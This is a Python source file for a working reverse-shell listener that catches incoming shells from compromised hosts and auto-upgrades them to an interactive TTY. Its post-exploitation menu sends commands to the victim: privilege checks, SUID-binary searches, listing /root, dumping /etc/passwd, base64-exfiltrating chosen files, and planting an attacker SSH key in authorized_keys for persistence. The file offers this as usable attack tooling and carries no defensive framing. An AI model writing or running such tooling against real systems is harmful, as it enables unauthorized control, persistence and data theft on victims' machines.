import socket
import threading
import time

class ShellSession:
    def __init__(self, conn, addr, session_id):
        self.conn = conn
        self.addr = addr
        self.session_id = session_id
        self.active = True
        self.history = []

    def send(self, cmd):
        self.conn.send((cmd + "\n").encode())
        self.history.append(cmd)

    def close(self):
        self.active = False
        self.conn.close()

class TCPListener:
    def __init__(self, ip, port, auto_reconnect=False):
        self.ip = ip
        self.port = port
        self.auto_reconnect = auto_reconnect
        self.sessions = []
        self.listener_thread = None
        self.running = False

    def start(self):
        self.running = True
        self.listener_thread = threading.Thread(target=self._listen, daemon=True)
        self.listener_thread.start()

    def _listen(self):
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind((self.ip, self.port))
                    s.listen(5)
                    print(f"[*] Listening on {self.ip}:{self.port} ...")
                    while self.running:
                        try:
                            conn, addr = s.accept()
                            session_id = len(self.sessions) + 1
                            print(f"[+] Connection from {addr[0]}:{addr[1]} (Session {session_id})")
                            session = ShellSession(conn, addr, session_id)
                            self.sessions.append(session)
                            # Automate TTY upgrade
                            self.automate_tty_upgrade(session)
                            threading.Thread(target=self.handle_session, args=(session,), daemon=True).start()
                        except Exception as e:
                            print(f"[!] Accept error: {e}")
                            break
            except Exception as e:
                print(f"[!] Listener error: {e}")
                if not self.auto_reconnect:
                    break
                print("[*] Re-listening in 5 seconds...")
                time.sleep(5)

    def automate_tty_upgrade(self, session):
        # Send python3 pty.spawn, set TERM, and stty raw -echo
        try:
            time.sleep(0.5)  # Give the shell a moment to initialize
            session.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
            time.sleep(0.2)
            session.send("export TERM=xterm")
            time.sleep(0.2)
            session.send("stty raw -echo")
            time.sleep(0.2)
        except Exception as e:
            print(f"[!] TTY upgrade failed: {e}")

    def post_exploitation_menu(self, session):
        print("\n[Post-Exploitation Menu]")
        print("1. Check sudo rights (sudo -l)")
        print("2. List /root files (ls -la /root/)")
        print("3. Show network info (ip a, netstat -tulnp)")
        print("4. Find SUID binaries (find / -perm -4000 2>/dev/null)")
        print("5. Add SSH key to authorized_keys")
        print("6. Exfiltrate a file (base64)")
        print("7. Show /etc/passwd")
        print("0. Back to shell")
        choice = input("Select option: ")
        if choice == '1':
            session.send("sudo -l")
        elif choice == '2':
            session.send("ls -la /root/")
        elif choice == '3':
            session.send("ip a; netstat -tulnp")
        elif choice == '4':
            session.send("find / -perm -4000 2>/dev/null")
        elif choice == '5':
            pubkey = input("Enter your public SSH key: ")
            session.send(f'echo "{pubkey}" >> ~/.ssh/authorized_keys')
        elif choice == '6':
            filepath = input("Enter file path to exfiltrate: ")
            session.send(f'base64 "{filepath}"')
        elif choice == '7':
            session.send("cat /etc/passwd")
        else:
            print("Returning to shell...")

    def handle_session(self, session):
        def recv():
            while session.active:
                try:
                    data = session.conn.recv(4096)
                    if not data:
                        break
                    print(data.decode(errors='ignore'), end='')
                except:
                    break
            session.active = False
            print(f"[!] Session {session.session_id} closed.")
        threading.Thread(target=recv, daemon=True).start()
        while session.active:
            try:
                cmd = input("")
                if cmd.strip() == "!exit":
                    session.close()
                    break
                elif cmd.strip() == "!history":
                    for i, h in enumerate(session.history):
                        print(f"{i+1}: {h}")
                elif cmd.strip().startswith("!search "):
                    term = cmd.strip().split(" ", 1)[1]
                    for i, h in enumerate(session.history):
                        if term in h:
                            print(f"{i+1}: {h}")
                elif cmd.strip() == "!post":
                    self.post_exploitation_menu(session)
                else:
                    session.send(cmd)
            except KeyboardInterrupt:
                session.close()
                break

    def stop(self):
        self.running = False
        print("[*] Listener stopped.") 